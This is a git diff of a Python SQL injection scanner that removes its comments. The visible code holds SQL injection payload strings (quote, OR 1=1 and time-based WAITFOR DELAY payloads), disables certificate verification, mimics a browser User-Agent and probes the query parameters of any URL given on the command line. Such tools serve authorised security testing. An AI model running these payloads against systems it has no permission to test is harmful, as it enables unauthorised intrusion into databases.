@@ -4,20 +4,20 @@ from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 import sys
 import urllib3
 
-# Disable insecure HTTPS warnings (because we set verify=False)
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-# Headers to mimic a real browser
+
 headers = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                   "(KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
 }
 
-# Payloads to test SQL injection
+
 error_payloads = ["'", "\"", "'--", "\"--", "' OR 1=1 --", "\" OR 1=1 --"]
 time_based_payload = "'; WAITFOR DELAY '0:0:5' --"
 
-# Common SQL error messages to look for
+
 sql_errors = [
     "you have an error in your sql syntax;",
     "unclosed quotation mark",
@@ -50,7 +50,7 @@ def inject_get(url):
             except Exception as e:
                 print(f"[-] Request failed: {e}")
 
-    # Blind time-based SQLi check
+    
     print("[*] Testing blind SQLi (time delay)...")
     tampered = query.copy()
     for param in tampered:
@@ -72,7 +72,6 @@ def inject_get(url):
     print("[-] No SQL Injection vulnerabilities found.")
 
 
-# Main entry point - get URL from command line argument
 if len(sys.argv) < 2:
     print("Usage: python sqli_scanner.py <target_url>")
     sys.exit(1)
